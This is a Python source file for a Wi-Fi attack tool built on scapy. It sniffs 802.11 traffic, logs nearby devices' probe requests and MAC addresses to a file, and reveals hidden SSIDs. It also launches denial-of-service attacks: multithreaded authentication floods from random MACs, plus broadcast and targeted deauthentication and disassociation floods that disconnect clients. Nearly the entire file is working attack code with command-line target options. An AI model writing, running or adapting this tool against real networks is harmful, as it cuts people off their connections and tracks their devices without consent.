#!/usr/bin/python
# -*-*- coding: utf-8 -*-*-
'''
@author: phantom11235
@email:2440959899@qq.com
'''
from scapy.all import *
#from macpy import Mac
import sys
import os
from optparse import OptionParser
import time
import random
import threading
import signal
import re
from pyric import pyw


parser=OptionParser("usage % prog -i<interface> -a <target_ssid> -m<target_mac> -n<attack_thread_number>")

parser.add_option("-i","--interface",
                  dest="interface",
                  default="wlan0mon",
                  help=[x for x in pyw.winterfaces()])

parser.add_option("-a","--auth_attack_ssid",
                  dest="auth_attack_ssid",
                  default="1",
                  help="Declare your target's ssid")

parser.add_option("-m","--auth_attack_mac",
                  dest="auth_attack_mac",
                  default="1",
                  help="If you know the attack target mac,type in it!")

parser.add_option("-n","--number",
                  dest="number",
                  default=5,
                  help="Assign your num of threads for attack (PS:this option should use with the option -a)  ")

parser.add_option("-d","--deauth_attack_ssid",
                  dest="deauth_attack_ssid",
                  default="1",
                  help="Claim your target ssid for DEAUTH attack!(PS:can not be used with the option -e simultaneously)")

parser.add_option("-e","--deauth_attcak_mac",
                  dest="deauth_attack_mac",
                  default="1",
                  help="Claim your target client's MAC address for DEAUTH attack!(PS:can not be used with the option -d simultaneously)")

(options,args)=parser.parse_args()



#interface = sys.argv[1]
option=''
nets = []
mac_add=[]
#mac = Mac()
hiddenlist=[]     #the hidden ap prepared to be checked
attack_list=['1']
target='1'
ap='1'
thread_number=0
deauth_ap=[]     #collect the ap's information nearby and prepare to DEAUTH
deauth_client=[] #collect  the clients' information nearby and prepare to DEAUTH
flags=0          #mark the request is comes from function Deauth,and output the correct response in function sendpackage
check=0          #check if the function Probe has started ,and make sure that would not be started repeatedly
attack_time=10   #set the number of packages for attacking the client which is going through the auth procedure
lock=threading.Lock()   #control the change of deauth_ap
stop=0                  #check if target ssid's mac has been found,and make sure that the function Deauth would not be started repeatedly
collect_stop_flag=0     #make sure that the function collect_ap would not be started twice
attack_permit=0         #check this parameter to decide if the attack (to the client being auth) should be started


def sendpackage(package1):
    global thread_number
    if options.deauth_attack_mac!='1':
        package_remain=5
    else:
        package_remain=100
    if (flags==1):
        print "\033[33;1m"+"Thread has been started successfully"+"\033[0m"
    else:
        print ("\033[33;1m"+"Thread "+str(thread_number)+" has been started successfully"+"\033[0m")
    while (package_remain>0):
        sendp(package1,iface=options.interface)
        package_remain=package_remain-1
    if (flags==1):
        print ("\033[33;1m" + "Thread has completed" + "\033[0m")
    else:
        print ("\033[33;1m"+"Thread "+str(thread_number)+" has completed"+"\033[0m")
    os.kill(os.getpid(),signal.SIGINT)
    os.kill(os.getppid(), signal.SIGINT)



def Authflood(package):
    global thread_number
    if package.haslayer(Dot11Beacon) and package.getlayer(Dot11Beacon).info==str(options.auth_attack_ssid) and options.auth_attack_mac=='1':
        auth_attack_target=package.getlayer(Dot11).addr2
        print ("\033[33;1m"+"[+]Target mac get!"+"\033[0m")
        try :
            auth_package=RadioTap()/Dot11(addr1=auth_attack_target,addr2=RandMAC(),addr3=auth_attack_target) / Dot11Auth(algo=0,seqnum=0x0001,status=0x0000)  #目标地址为ap,故ad3设置为目标ap地址。《TCP Illustrated》
            while (thread_number<options.number):
                new_thread=threading.Thread(target=sendpackage,args=(auth_package,))
                new_thread.start()
                thread_number=thread_number+1
        except:
            print ("\033[31;1m"+"create auth package failed"+"\033[0m")
            os.exit(0)
    elif(options.auth_attack_mac!='1'):
        try:
            target_mac=options.auth_attack_mac
            auth_package = RadioTap()/Dot11(addr1=target_mac, addr2=RandMAC(),addr3=target_mac) / Dot11Auth(algo=0, seqnum=0x0001,status=0x0000)
            while (thread_number < options.number):
                new_thread = threading.Thread(target=sendpackage, args=(auth_package,))
                new_thread.start()
                thread_number = thread_number + 1
        except:
            print ("\033[31;1m" + "create auth package failed" + "\033[0m")
            os.exit(0)


def collect_ap(package):
    global deauth_ap
    if package.haslayer(Dot11):
        if package.haslayer(Dot11Beacon) or package.haslayer(Dot11ProbeResp):
            print "detect package"
            ssid = get_ssid(package.getlayer(Dot11Elt).info)
            bssid = package.addr3.lower()  # 确认是addr2还是addr3？
            try:  # 信道获取不太懂，借鉴fluxion，具体参见协议包格式，thanks to fluxion！
                channel = str(ord(package[Dot11Elt:3].info))
            except:
                dot11elt = package.getlayer(Dot11Elt, ID=61)
                channel = ord(dot11elt.info[-int(dot11elt.len):-int(dot11elt.len) + 1])
            if not channel:
                print "Can't get the channel of " + ssid
            with lock:
                deauth_ap.append({"name": str(ssid), "mac": str(bssid), "channel": str(channel)})
                print "name: " + str(ssid) + " mac: " + str(bssid) + " channel " + str(channel) + " added!"


def Deauth(package):
        global check,stop,collect_stop_flag
        if collect_stop_flag==0:
            temp= threading.Thread(target=collect_ap,args=(package,))
            temp.start()
            collect_stop_flag=1
        else:
            pass
        if stop==0:
            if (check==0 and options.deauth_attack_ssid!='1'):
                Probe(package,options.deauth_attack_ssid)
            global deauth_ap,flags,deauth_client
            flags=1
            if  options.deauth_attack_ssid!='1':
                if options.deauth_attack_ssid in (i["name"] for i in deauth_ap):
                    print "ssid found!"
                    check=1
                    stop=1
                    for u in deauth_ap:
                        if u["name"]==options.deauth_attack_ssid:
                            print "Attacking!"
                            target=u["mac"]
                            target_channel=u['channel']
                            p=threading.Thread(target=hop_and_deauth,args=(target_channel,target,0))
                            p.start()
                            break
            else:
                client_ap_channel=0
                package.addr2=package.addr2.lower()
                package.addr1=package.addr1.lower()
                if package.type in [1,2]:
                    deauth_client.append({"client":package.addr1,"ap":package.addr2})
                if options.deauth_attack_mac in (c["client"] for c in deauth_client):
                    for x in deauth_client:
                        if x["client"]==options.deauth_attack_mac:
                            client_ap=x['ap']
                            break
                    while not client_ap_channel:
                        if client_ap in (y["mac"] for y in deauth_ap):
                            for t in deauth_ap:
                                if t['mac']==client_ap:
                                    client_ap_channel=t['channel']
                                    break
                    t=threading.Thread(target=hop_and_deauth,args=(client_ap_channel,options.deauth_attack_mac,client_ap))
                    t.start()


def Probe(package,ssid):
    global deauth_ap,check
    packet=RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff",addr2="11:11:dd:22:33:33",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID="SSID",info=ssid)
    sendp(packet,iface=options.interface,count=1)
    if package.haslayer(Dot11):
        if package.haslayer(Dot11ProbeResp) and ssid==get_ssid(package.getlayer(Dot11Elt).info):
            print "detect package"
            ssid = get_ssid(package.getlayer(Dot11Elt).info)
            bssid = package.addr3.lower()  # 确认是addr2还是addr3？
            try:  # 信道获取不太懂，借鉴fluxion，具体参见协议包格式，thanks to fluxion！
                channel = str(ord(package[Dot11Elt:3].info))
            except:
                dot11elt = package.getlayer(Dot11Elt, ID=61)
                channel = ord(dot11elt.info[-int(dot11elt.len):-int(dot11elt.len) + 1])
            if not channel:
                print "Can't get the channel of " + ssid
            with lock:
                deauth_ap.append({"name": str(ssid), "mac": str(bssid), "channel": str(channel)})
                print "name: " + str(ssid) + " mac: " + str(bssid) + " channel " + str(channel) + " added!"
            check=1


def isset(v):
    if v==1:
        return 1
    else:
        return 0


def hop_and_deauth(channel,target,ap):
    if (check==1):
        try:
            interface=pyw.getcard(options.interface)
            pyw.chset(interface,int(channel),None)
            print "Hopping successfully"
        except:
            print "Channel "+str(channel)+" hopping failed!"
            sys.exit(0)
        if options.deauth_attack_ssid!='1':
            pkt=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=str(target),addr3=str(target))/Dot11Deauth(reason=7)
            print target
            print "broadcast attack!!!!!!!!!!!!!"
            sendpackage(pkt)
        else:
            pkt1 = RadioTap() / Dot11(addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=7)
            pkt2 = RadioTap() / Dot11(addr1=ap, addr2=target, addr3=target) / Dot11Deauth(reason=7)
            pkt3 = RadioTap() / Dot11(addr1=target, addr2=ap, addr3=ap) / Dot11Disas()
            pkt4 = RadioTap() / Dot11(addr1=ap, addr2=target, addr3=target) / Dot11Disas()
            sendpackage(pkt1)
            sendpackage(pkt2)
            sendpackage(pkt3)
            sendpackage(pkt4)
       # probe_package=RadioTap()/Dot11(addr="ff:ff:ff:ff:ff:ff",addr2="DD:DD:DD:DD:FF:11",addr3="ff:ff:ff:ff:ff:ff")/Dot11



def wifisniffer(package):
    global control_repeat,attack_permit,attack_time,target,ap
    if package.haslayer(Dot11ProbeReq):
        ssid = package.getlayer(Dot11ProbeReq).info
        ssid=get_ssid(str(ssid))
        if package.haslayer(Dot11):
            etc = package.getlayer(Dot11).addr2
        if ssid not in nets:
            nets.append(ssid)
            print '[+] Detected New Probe Request: ' + 'from ' + etc + ' is ' + ssid
            try :
                with open ("captured ssid", "w") as create :
                    create.write('Searched on '+time.asctime(time.localtime(time.time()))+'\n')
            except:
                print("\033[31;1m"+ "Create file failed! System error"+"\033[0m")
                sys.exit(0)

            with open("captured ssid", "a") as f:
                f.write(ssid+' has been detected and the requester mac is '+etc+'\n')
    if package.haslayer(Dot11Beacon):
        if package.getlayer(Dot11Beacon).info=='':
            hidden=package.getlayer(Dot11).addr2
            print ("\033[31;1m"+'[-]Detect a hidden ap ! Mac is :'+hidden+"\033[0m")
            hiddenlist.append(hidden)
    if package.haslayer(Dot11ProbeResp):
        if package.getlayer(Dot11).addr2 in hiddenlist:
            print ("\033[33;1m"+'[-]A recorded hidden ap has been confirmed ! SSID is :'+package.getlayer(Dot11ProbeResp).info+' the Mac is '+package.getlayer(Dot11).addr+"\033[0m")
    if package.haslayer(Dot11Auth):
        target=package.getlayer(Dot11).addr2
        ap=package.getlayer(Dot11).addr1
    if target not in attack_list and attack_permit==1:
        attack_list.append(target)
        print ("\033[31;1m"+"[*]Detected device during auth....... \nSending package...."+"\033[0m")
        time.sleep(0.5)
        try:
            while(attack_time>0):
                attack1=RadioTap()/Dot11(addr1=target,addr2=ap,addr3=ap)/Dot11Deauth(reason=7)
                attack2=RadioTap()/Dot11(addr1=ap,addr2=target,addr3=target)/Dot11Deauth(reason=7)
                sendp(attack1)
                sendp(attack2)
                attack_time=attack_time-1
            attack_time=10
            print ("\033[42;1m"+"[*]Attack has been completed successfully"+"\033[0m")
        except:
            print ("\033[41;1m"+"[*]Something wrong happened ! Attack failed. "+"\033[0m")


def get_ssid(name_before):
    if name_before and u"\x00" not in "".join([x if ord(x)<128 else "" for x in name_before]):
        try :
            name_after=name_before.decode("utf-8")
            return name_after
        except:
            name_after=unicode(name_before,errors="ignore")
            return name_after
    elif name_before=="":
        return  ""
    else:
        print "Illegal ssid!"
        return "no"


def test_if_mon(package):
    if "mon" not in options.interface:
        return 1


def change_if_no_mon(interface):
    print ("\033[33;1m" + "Error! Netcard seems not on monitor mode. " + "\033[0m")
    wlan = raw_input("Plz declare the netcard you wanna to monitor:")
    try:
        print ("\033[41;1m" + "Trying to change it on monitor mode......" + "\033[0m")
        time.sleep(2)
        try:
            os.system("airmon-ng start " + wlan)
            print ("\033[31;1m" + "Changing success..." + "\033[0m")
            options.interface=wlan+"mon"
        except:
            print ("\033[31;1m" + "Changing fail...,Maybe the wireless netcard doesn't support monitor mode" + "\033[0m")
            sys.exit(0)
    except:
        print ("\033[31;1m" + "Changing failed...Some fatal errors occured!" + "\033[0m")
        sys.exit(0)


def main():

    global attack_permit
    if options.auth_attack_ssid=="1" and options.auth_attack_mac=="1" and options.deauth_attack_ssid==1 and options.deauth_attack_mac==1:

        attack_permit_ask = raw_input("Do you wanna to attack the device which just begin auth?\nEnter y to permit this kind of attack or others to deny:")
        if attack_permit_ask == 'y':
            attack_permit = 1
            print "\n"
        else:
            attack_permit = 0
            print "\n"

        option=raw_input("Do you wanna to run airodump?\nThat will make the sniffer more effective.\nPress y to start it,or press n to neglect it\nEnter your answer(y or n):")
        if option=='y':
            try:
                os.system("airodump-ng start "+options.interface+" &")
                print("\033[31;1m"+" airodump start background successfully "+ "\033[0m")
                sniff(iface=options.interface, prn=wifisniffer)
            except :
                print "airodump start background failed!"
                sys.exit(1)

    elif options.auth_attack_ssid!="1" or options.auth_attack_mac!='1':

        if (options.auth_attack_mac!='1'):
            try:
                if (re.match("([0-9a-f]{2}){6}", options.auth_attack_mac.lower())):
                    pass
                else:
                    print "Mac address is illegal!PLZ REENTER!"
                    sys.exit(0)
            except:
                pass
        try:
            sniff(iface=options.interface,prn=Authflood)
        except:
            print "Authflood attack start failed,check your setting including your NETCARD's type and network connection status"
            sys.exit(1)

    elif(options.deauth_attack_ssid!='1' and options.deauth_attack_mac=='1'):
        try:
            print "Deauth Attack started!"
            sniff(iface=options.interface,prn=Deauth,stop_filter=isset(stop))
        except:
            print "Deauthflood attack start failed,check your setting"
            sys.exit(1)

    elif(options.deauth_attack_ssid=='1' and options.deauth_attack_mac!='1'):
        try:
            print "Deauth Attack started!"
            sniff(iface=options.interface,prn=Deauth)
        except:
            print "Deauthflood attack start failed,check your setting"
            sys.exit(1)
    elif(options.deauth_attack_ssid!='1' and options.deauth_attack_mac!='1'):
        print "This two options can not be used simultaneously,plz check your input!"

    else:
        try:
            sniff(iface=options.interface, prn=wifisniffer)
        except:
            print "FATAL ERROR OCCURED!!!!!!!!!!!!"
            sys.exit(1)

if __name__=="__main__":

    print "start"
    if "mon" not in options.interface:
       change_if_no_mon(options.interface)
    main()
